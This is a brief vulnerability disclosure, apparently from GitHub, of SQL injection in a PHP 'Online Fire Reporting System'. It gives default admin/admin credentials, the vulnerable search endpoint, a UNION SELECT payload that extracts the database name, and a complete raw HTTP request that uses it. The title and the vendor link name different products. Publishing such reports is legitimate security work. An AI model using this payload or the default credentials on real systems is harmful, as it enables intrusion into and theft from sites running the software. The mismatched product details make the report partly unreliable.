# Online Fire Reporting System v1.0  has SQL injection

The password for the backend login account is: admin/admin

vendors: https://www.campcodes.com/projects/php/online-job-search-system-using-php-mysql-free-download/

Vulnerability File: /eris/index.php?q=result&searchfor=byfunction

Vulnerability location: /eris/index.php?q=result&searchfor=byfunction,SEARCH

Current database name: erisdb

[+] Payload: SEARCH=9890') union select 1,2,3,database(),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+&CATEGORY=&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2 // Leak place ---> SEARCH

```sql
POST /eris/index.php?q=result&searchfor=byfunction HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=mho0fs263l0tis8l6v3lqpu6q4
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 140

SEARCH=9890') union select 1,2,3,database(),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+&CATEGORY=&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
```

![image](https://user-images.githubusercontent.com/54017627/170849313-4d07d322-e01d-48fc-911e-7900f3a49463.png)

![image](https://user-images.githubusercontent.com/54017627/170849323-e8d744e2-4a70-4d9e-901a-524f48cdf493.png)
